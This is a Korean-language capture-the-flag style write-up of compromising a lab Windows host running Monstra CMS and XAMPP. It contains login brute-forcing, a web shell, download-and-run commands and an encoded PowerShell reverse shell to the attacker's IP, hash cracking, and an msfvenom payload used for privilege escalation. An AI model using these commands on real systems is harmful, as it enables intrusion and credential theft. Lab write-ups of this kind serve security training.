# Monster

> target: 192.168.123.180 (monster.pg)
> attack: 192.168.45.227

# reconnaissance

## port scan

```bash
nmap -Pn -O -oN nmap.txt -sV -sC -p- --open 192.168.123.180
```

![nmap 결과 1](https://github.com/user-attachments/assets/16dbbbb0-99bd-453b-9b8b-9284ff265d7d)
![nmap 결과 2](https://github.com/user-attachments/assets/d8cd13a4-8404-43f6-8eb3-b59f019f219f)
![nmap 결과 3](https://github.com/user-attachments/assets/40bdf129-2e59-452d-a438-0f723c575e12)

> 135, 139, 445, 443(openssl 1.1.1c), 3389, 5040, 7680, 49664~49669 오픈

## subdomain scan

```bash
ffuf -u http://192.168.123.180 -H "Host:FUZZ.192.168.123.180" -w /usr/share/seclists/Discovery/DNS/namelist.txt
```

![ffuf 서브도메인 스캔](https://github.com/user-attachments/assets/ce24a810-aa5a-40ea-b687-0bb6b11a4545)

> 결과 없음

## web 루트

```bash
curl 192.168.123.180 -s | grep href
```

![curl href 확인](https://github.com/user-attachments/assets/3425664b-5071-4c08-b234-f2de9e142d8c)

> `/assets` 경로 발견

```bash
curl 192.168.123.180/assets
```

![assets 301 응답](https://github.com/user-attachments/assets/a3c96884-9250-4d33-97cd-d69a151bcf3e)

> 301 Redirect라 내용을 볼 수 없다

## mitmproxy로 Location 헤더 제거

스크립트: [tmp/remove_location.py](tmp/remove_location.py)

```bash
apt install mitmproxy
mitmproxy -s remove_location.py -p 80
```

```bash
curl -x http://127.0.0.1:80 http://192.168.123.180/assets
```

![mitmproxy 경유 assets 요청](https://github.com/user-attachments/assets/7a3d6891-e0eb-4994-bf5a-c02e45ff6335)

```bash
curl -x http://127.0.0.1:80 http://192.168.123.180/assets/
```

![assets 인덱스 응답](https://github.com/user-attachments/assets/8690c5ce-d443-4327-bb0f-0efe8ddcbd0e)

> Apache 기본 icons 디렉터리가 노출된다

```bash
curl -x http://127.0.0.1:80 http://192.168.123.180/icons/back.gif
```

![back.gif 응답](https://github.com/user-attachments/assets/1651d4dd-019c-4936-be4c-6b77f350aec7)

> `Kevin Hughes, Kevinh@eit.com, September 1995` — Apache 기본 아이콘 파일이다

```bash
curl -X GET -x http://127.0.0.1:80 http://192.168.123.180/assets/icons/folder.gif -O
```

![folder.gif 응답](https://github.com/user-attachments/assets/7c3d9cdf-d2cf-40f6-ac52-4928352d72aa)

> `mailto:postmaster@localhost`, `Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10`

## openssl 1.1.1c BOF 시도 (실패)

> exploit-db 22968은 Half-Life 게임 서버 대상 취약점이라 이 대상과는 불일치. 버림

스크립트: [tmp/22968.c](tmp/22968.c) (`/usr/share/exploitdb/exploits/linux/remote/22968.c`)

![exploit-db 22968](https://github.com/user-attachments/assets/6a3e475c-2aa7-497e-a0f8-4eb150ffb82c)

## path scan

```bash
ffuf -u http://192.168.123.180/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -fc 403
```

![ffuf 경로 스캔](https://github.com/user-attachments/assets/8ae2affd-b5db-46fa-b442-62c33de32778)

> `blog`, `assets` 발견

## blog 애플리케이션 판별

```bash
curl http://192.168.123.180/blog/
```

![blog 메인 페이지](https://github.com/user-attachments/assets/3e068ecf-1023-4825-87b9-0128c6023f58)

> Monstra 3.0.4

```bash
searchsploit Monstra
```

![searchsploit Monstra](https://github.com/user-attachments/assets/1cc24991-5b6a-48c2-af30-b000757586ad)

> 49949.py — Authenticated RCE
> 52038.py — RCE (username, password 필요)
> 44502.txt — stored XSS (CVE-2018-10109), editor 권한이 필요해서 크리덴셜 없이는 못 쓴다

익스플로잇: [tmp/52038.py](tmp/52038.py)

```bash
apt install bat
cat 52038.py | batcat
```

> 52038.py는 username, password가 필요하다. 유효한 로그인 계정부터 확보한다

## SMB / RPC 열거

```bash
apt install smbclient
smbclient -L 192.168.123.180
```

```text
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

![smbclient 접속 거부](https://github.com/user-attachments/assets/3ec88753-6c82-46d2-a67b-fbbbe62928f0)

```bash
smbclient -L //192.168.123.180 -N
```

```text
session setup failed: NT_STATUS_ACCESS_DENIED
```

![smbclient anonymous 거부](https://github.com/user-attachments/assets/47801d7c-c63e-49e0-ab2a-10036d79bea3)

```bash
sudo apt install -y python3-impacket
python3 /usr/share/doc/python3-impacket/examples/rpcdump.py @192.168.123.180 | tee rpc
rpcclient -U '' -N 192.168.123.180
```

> TCP 연결은 성공하지만 anonymous 접근은 거부된다 (덤프 결과: [tmp/rpc.txt](tmp/rpc.txt))

![rpcclient anonymous 거부](https://github.com/user-attachments/assets/682a5d96-3d87-428f-9774-6c9790183c3e)

```bash
smbclient -L //192.168.123.180 -N -p 139
nmap -p139,445 --script smb-protocols 192.168.123.180
```

![nmap smb-protocols](https://github.com/user-attachments/assets/e31b4ce7-91ab-42e9-8375-3c0f7829f936)

> SMB 2.0 이상만 협의됨 — SMB1 미사용

```bash
apt install netexec
nxc smb 192.168.123.180 -u '' -p '' --shares
```

![nxc smb hostname 수집](https://github.com/user-attachments/assets/20972255-fe26-4148-afa0-8210d2500a12)

> hostname MIKE-PC 확인

## blog 내부 경로

```bash
apt install httpie
http http://192.168.123.180/blog/
```

> 링크가 monster.pg 도메인으로 나온다

```text
http://monster.pg/blog/home
http://monster.pg/blog/blog
http://monster.pg/blog/users
http://monster.pg/blog/users/login
http://monster.pg/blog/users/registration
```

![blog 링크 목록](https://github.com/user-attachments/assets/1762f739-80ad-4934-8a7f-0e26ebe3a8fe)

```bash
printf '\n192.168.123.180 monster.pg\n' >> /etc/hosts
```

![hosts 등록](https://github.com/user-attachments/assets/623ed7c0-94e2-44dd-a76e-a31b08bccf90)

```bash
http http://monster.pg/blog/users/
http http://monster.pg/blog/users/login/
http http://monster.pg/blog/users/registration/
```

![blog users 페이지](https://github.com/user-attachments/assets/bba1b548-105e-4d72-99a1-ae43309926dd)
![blog login 페이지](https://github.com/user-attachments/assets/dbedd8d0-61f1-4b41-83c0-009cf80c69c9)
![blog registration 페이지](https://github.com/user-attachments/assets/35286681-c1fd-46e1-8800-9d2bc09eaa60)

# foothold

## 사전 준비

> users 페이지에서 admin 계정 확인. cewl로 사이트 단어 사전을 만든다

```bash
cewl http://192.168.123.180/ -w words.txt
```

## CSRF 브루트포스

> 로그인 폼은 CSRF 토큰을 요구한다

![CSRF 토큰 확인](https://github.com/user-attachments/assets/81cf6e11-b507-4002-ab8f-9efce1910500)

스크립트: [tmp/bruteforce_csrf_php.py](tmp/bruteforce_csrf_php.py), 워드리스트: `/usr/share/seclists/Usernames/Names/names.txt`

> 실패 메시지 포맷을 먼저 확인한다

```bash
curl -X POST http://monster.pg/blog/users/login/ --data "username=admin&password=admin&login_submit=Log+In&csrf=csrf_token"
```

1차 시도 — users는 words.txt, passwords는 xato 상위 1000개:

```bash
python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users words.txt --passwords /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt -T 20
```

![브루트포스 1차](https://github.com/user-attachments/assets/aaa17c32-012e-43a3-8413-47c89ea0ecea)

2차 시도 — users는 names.txt, passwords는 words.txt:

```bash
python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users /usr/share/seclists/Usernames/Names/names.txt --passwords words.txt -T 10
```

![브루트포스 2차 — admin 발견](https://github.com/user-attachments/assets/ed4a6dec-2682-401f-ad88-97c5338c550d)

> username: admin, email: wazowski@monster.pg, registered: 22.2.2022

## 52038.py RCE

```bash
python3 52038.py http://monster.pg/blog admin REDACTED
```

![52038.py 실행](https://github.com/user-attachments/assets/20e2bd5b-b114-4e1f-a7aa-da1ef623e94a)

```text
Logging in...
Login successful
Preparing shell...
Your shell is ready: http://monster.pg/blog/public/themes/default/tghjm.chunk.php
```

## 웹셸 확인

```bash
curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=whoami"
```

![웹셸 whoami](https://github.com/user-attachments/assets/7cc53afb-235e-49b5-bb7e-a9d6754d16f9)

> mike-pc\mike

```bash
curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=whoami%20/priv"
```

```text
Privilege Name                Description                           State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking              Enabled
SeUndockPrivilege             Remove computer from docking station  Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set        Disabled
SeTimeZonePrivilege           Change the time zone                  Disabled
```

> 대부분 Disabled — 낮은 권한

## 리버스 셸

> 내 IP: 192.168.45.227. 리스너와 전송용 웹서버를 띄운다 (페이로드는 https://www.revshells.com 참조)

```bash
nc -lvnp 443
python3 -m http.server 80
```

![reverse.ps1 작성](https://github.com/user-attachments/assets/27d8989f-0b04-4c97-85ea-7f93f4f8fb46)
![리버스 셸 스크립트 준비](https://github.com/user-attachments/assets/d5795445-b154-4592-ac40-c6edeea8e1c9)

```bash
curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.227/nc.exe -Outfile C:\Windows\Temp\nc.exe"
```

```text
curl: (3) URL rejected: Malformed input to a URL function
```

> 공백은 %20으로 인코딩해야 한다

```bash
curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.227/reverse.ps1%20-Outfile%20C:\Windows\Temp\reverse.ps1"
```

> reverse.ps1 다운로드 성공

```text
192.168.123.180 - - [01/Nov/2026 02:44:47] "GET /reverse.ps1 HTTP/1.1" 200
```

```bash
curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps1"
```

> 실패. revshells ps#3으로 reverse.ps2를 다시 올려도 실패

```bash
curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.227/reverse.ps2%20-Outfile%20C:\Windows\Temp\reverse.ps2"
curl "http://monster.pg/blog/public/themes/default/tghjm.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps2"
```

> 원인 파악을 위해 웹셸 응답을 다시 확인한다

```bash
curl -G "http://monster.pg/blog/public/themes/default/tghjm.chunk.php" --data-urlencode "cmd=whoami"
```

> php system()은 stdout만 반환하므로 에러가 보이지 않아 원인을 유추해야 한다. -G + --data-urlencode 조합으로 공백 문제를 해결한다

> powershell -e가 기대하는 Base64는 UTF-16LE이다. UTF-8 Base64를 넣으면 디코딩에 실패해 무반응이 나온다. revshells.com이 생성한 UTF-16LE Base64를 그대로 쓰거나, 직접 만들 때는 `echo -n '...' | iconv -t UTF-16LE | base64 -w 0`로 만든다

![UTF-16LE Base64 인코딩](https://github.com/user-attachments/assets/15be2710-9f01-4efa-bed8-71025d60ce0e)

```bash
apt install netcat-traditional
nc -lvnp 443
```

```bash
curl -G "http://monster.pg/blog/public/themes/default/tghjm.chunk.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

> 성공 조건 정리
> 1. 리버스 셸 실행 후 엔터를 눌러야 한다
> 2. -e Base64는 UTF-16LE 형식이어야 한다
> 3. php system()은 stdout만 보여주므로 에러가 오지 않아 무반응처럼 보인다
> 4. -G와 --data-urlencode는 항상 함께 쓴다

```text
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.227] from (UNKNOWN) [192.168.123.180] 49992
PS C:\xampp\htdocs\blog\public\themes\default>
```

![리버스 셸 성공](https://github.com/user-attachments/assets/a80eb30d-7c68-4447-84f0-41eac677bc72)

```text
Username: MIKE-PC\Administrator
RunAs User: MIKE-PC\Administrator
```

## local.txt

```text
PS C:\Users\Mike\Desktop> ls

    Directory: C:\Users\Mike\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/1/2026   1:01 AM             34 local.txt

PS C:\Users\Mike\Desktop> type local.txt
```

![local.txt 확인](https://github.com/user-attachments/assets/b52b857b-555a-488d-a57b-4817582f0379)

> local.txt 획득 (플래그 REDACTED)

```text
PS C:\Users\Mike> ipconfig

Connection-specific DNS Suffix  . :
IPv4 Address. . . . . . . . . . . : 192.168.123.180
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.243.254
```

## 데이터베이스 사용자 해시

```text
PS C:\xampp\htdocs\blog\storage\database> type users.table.xml
```

```xml
<root><options><autoincrement>2</autoincrement></options><fields><login/><password/><email/><role/><date_registered/><firstname/><lastname/><login/><twitter/><skype/><hash/><about_me/></fields><users><id>1</id><uid>de58425259</uid><firstname/><lastname/><twitter/><skype/><about_me/><login>admin</login><password>a2b4e80cd640aaa6e417febe095dcbfc</password><email>wazowski@monster.pg</email><hash>jJkdUX1FOFiI</hash><date_registered>1645512776</date_registered><role>admin</role></users><users><id>2</id><uid>800c7d9797</uid><firstname/><lastname/><twitter/><skype/><about_me/><login>mike</login><password>844ffc2c7150b93c4133a6ff2e1a2dba</password><email>mike@monster.pg</email><hash>8vPjvUPDHhRp</hash><date_registered>1645512909</date_registered><role>user</role></users></root>
```

> mike: 844ffc2c7150b93c4133a6ff2e1a2dba
> admin: a2b4e80cd640aaa6e417febe095dcbfc

## 해시 길이 확인

```bash
echo -n "844ffc2c7150b93c4133a6ff2e1a2dba" | wc -c
```

```text
32
```

> 32자 — MD5 (40이면 SHA-1, 64면 SHA-256)

## Monstra 해시 알고리즘

> 부팅 파일 C:\xampp\htdocs\blog\boot\defines.php에서 salt 확인

![defines.php salt 확인](https://github.com/user-attachments/assets/2020f02f-7d21-4253-b7cd-bb1e689e7689)

```php
define('MONSTRA_PASSWORD_SALT', 'YOUR_SALT_HERE');
```

> salt는 기본값 YOUR_SALT_HERE 그대로다

```php
public static function encryptPassword($password)
{
    return md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));
}
```

> trim 후 salt 문자열을 뒤에 붙이고 두 번 해시한다 — md5(md5(password + salt)). PHP의 `.` 연산으로 문자열이 결합된다

## hashcat rule 작성

> salt를 뒤에 append해야 하므로 rule로 처리한다. hashcat 룰 문법에서 `$`는 문자 하나를 뒤에 붙인다

```txt
# rule.txt
$Y $O $U $R $_ $S $A $L $T $_ $H $E $R $E
```

## 크랙

```bash
hashcat -m 2600 -a 0 "844ffc2c7150b93c4133a6ff2e1a2dba" /usr/share/wordlists/rockyou.txt -r rule.txt --show
```

![hashcat 크랙 성공](https://github.com/user-attachments/assets/52504d6b-1a7a-485c-82c3-4da9aa6671a9)

> mike / REDACTED

```text
Status...........: Cracked
Hash.Mode........: 2600 (md5(md5($pass)))
Hash.Target......: 844ffc2c7150b93c4133a6ff2e1a2dba
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (rule.txt)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

844ffc2c7150b93c4133a6ff2e1a2dba:REDACTED
```

# RDP

> 3389 오픈. mike 크리덴셜로 RDP 접속을 시도한다

```powershell
mstsc /v:192.168.123.180
```

![RDP 연결 성공 - Mike 데스크톱](https://github.com/user-attachments/assets/565c89aa-8733-4006-8dcd-c68d70038a24)
![RDP PowerShell 세션](https://github.com/user-attachments/assets/484bc3ab-6599-4572-9906-b42e62cb2ac0)

# privilege escalation

## WinPEAS

```bash
# kali
apt install peass
python3 -m http.server 80
```

```powershell
# target
iwr -uri http://192.168.45.227/winPEASany.exe -Outfile winPEASany.exe
.\WinPEASany.exe
```

> 눈에 띄는 escalation 벡터는 없었다. 대신 리스닝 포트와 httpd.exe 프로세스를 확인했다

```text
Protocol Local Address    Local Port Remote Address  Remote Port State      Process ID Process Name

TCP    0.0.0.0            80         0.0.0.0         0           Listening  5268       c:\xampp\apache\bin\httpd.exe
TCP    0.0.0.0            135        0.0.0.0         0           Listening  904        svchost
TCP    0.0.0.0            443        0.0.0.0         0           Listening  5268       c:\xampp\apache\bin\httpd.exe
TCP    0.0.0.0            445        0.0.0.0         0           Listening  4          System
```

> 80, 443을 모두 c:\xampp\apache\bin\httpd.exe가 리슨한다

## C:\xampp 정보 수집

```powershell
type passwords.txt
```

```text
PS C:\xampp> type passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

4) WEBDAV:

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
```

```powershell
type properties.ini
```

```text
PS C:\xampp> type properties.ini
[General]
installdir=C:\xampp
base_stack_name=XAMPP
base_stack_version=7.3.10-1
base_stack_platform=windows-x64
```

> XAMPP 7.3.10-1. searchsploit에서 LPE 후보를 찾았다 — XAMPP 7.4.3 - Local Privilege Escalation (windows/local/50337.ps1)

![searchsploit XAMPP LPE 50337.ps1](https://github.com/user-attachments/assets/2b7a13ad-fd7a-4c13-9b22-787ae0df7686)

## CVE-2020-11107 — xampp-control.ini Editor 교체

> xampp-control.ini의 Editor 값을 교체하면 xampp-control.exe가 해당 경로의 바이너리를 실행한다

익스플로잇 핵심 부분 (50337.ps1):

```powershell
$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
# Insert your payload path here
$replace = "C:\Temp\msf.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file
```

```powershell
iwr -uri http://192.168.45.227:80/50337.ps1 -Outfile change_ini.ps1
.\change_ini.ps1
(Get-Content C:\xampp\xampp-control.ini) -replace 'Editor=.*', 'Editor=C:\xampp\msf3.exe' | Set-Content C:\xampp\xampp-control.ini
```

> Editor 경로가 갱신됐는지 확인

```powershell
type C:\xampp\xampp-control.ini
```

## 페이로드 준비

```bash
apt install -y metasploit-framework
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f exe -o msf.exe
```

```powershell
Invoke-WebRequest -uri http://192.168.45.227:80/msf.exe -Outfile C:\xampp\msf3.exe
```

> 리스너는 443이나 80 포트를 쓴다 — 1234, 4444는 실패했다

```bash
nc -lvnp 443
```

## 트리거

> 페이로드를 직접 실행하지 않는다. xampp-control.exe가 ini를 읽어 Editor 경로를 실행하므로 xampp-control.exe 실행으로 트리거해야 리버스 셸이 가능하다

```powershell
C:\xampp\xampp-control.exe
```

![msf.exe 리버스 셸 연결](https://github.com/user-attachments/assets/bd61b6c3-c1f8-4966-bee4-68f97e8e6784)
![Administrator 셸 확인](https://github.com/user-attachments/assets/9d2fb6b6-e3fb-4127-918a-fc9f205f9604)

```text
PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/9/2026   6:32 PM              34 proof.txt
```

![proof.txt 확인](https://github.com/user-attachments/assets/1970ae79-309a-4a16-9497-1e5e4d7586e4)

> proof.txt 획득
